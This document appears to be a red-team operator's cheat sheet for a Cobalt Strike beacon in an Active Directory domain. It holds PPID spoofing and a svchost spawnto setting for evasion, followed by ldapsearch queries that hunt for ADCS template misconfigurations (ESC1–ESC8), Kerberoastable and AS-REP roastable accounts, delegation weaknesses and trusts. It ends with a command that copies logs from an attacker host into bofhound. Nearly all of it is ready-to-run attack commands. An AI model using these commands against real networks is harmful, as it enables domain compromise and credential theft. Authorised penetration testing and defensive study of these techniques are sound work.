
Set PPID to svchost - med-integ
```powershell
ppid 6424 
spawnto x64 C:\Windows\System32\svchost.exe
```

```powershell
--dn DC=contoso,DC=enclave
```

Domain, users, groups, OUs, and GPOs.
```powershell
ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) *,ntsecuritydescriptor

ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
```

Trusts
```powershell
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
```

ADCS + ESC1–ESC8
```powershell
ldapsearch (|(objectClass=pKIEnrollmentService)(objectClass=pKICertificateTemplate)(objectClass=msPKI-Enterprise-Oid)) *,ntsecuritydescriptor

ldapsearch (objectClass=pKICertificateTemplate) --attributes cn,msPKI-Enrollment-Flag,msPKI-Template-Schema-Version,msPKI-Certificate-Name-Flag,msPKI-RA-Signature,msPKI-Application-Policies,msPKI-Subject-Name-Flag,ntSecurityDescriptor
```

Kerberoastable Users
```
ldapsearch "(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=1048576)))" --attributes samAccountName,servicePrincipalName,objectsid,ntsecuritydescriptor
```

AS-REP Roastable Users
```
ldapsearch "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes samAccountName,userAccountControl,objectsid,ntsecuritydescriptor
```

Constrained Delegation (`msDS-AllowedToDelegateTo` not set to null)
```powershell
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
```

Unconstrained Delegation
```powershell
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```

```powershell
ldapsearch "(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" --attributes samAccountName,dnshostname,msDS-AllowedToActOnBehalfOfOtherIdentity,objectsid,ntsecuritydescriptor

ldapsearch "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" --attributes samAccountName,servicePrincipalName,msDS-AllowedToActOnBehalfOfOtherIdentity,objectsid,ntsecuritydescriptor
```
---

Bofhound
```powershell
scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .

bofhound -i logs/
```

Search single SID
```powershell
ldapsearch (objectSid=S-1-5-21-1076548718-1118529210-2193484809-2601)

ldapsearch "(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" --attributes samAccountName,dnshostname,msDS-AllowedToActOnBehalfOfOtherIdentity,objectsid,ntsecuritydescriptor --dn DC=contoso,DC=enclave
```
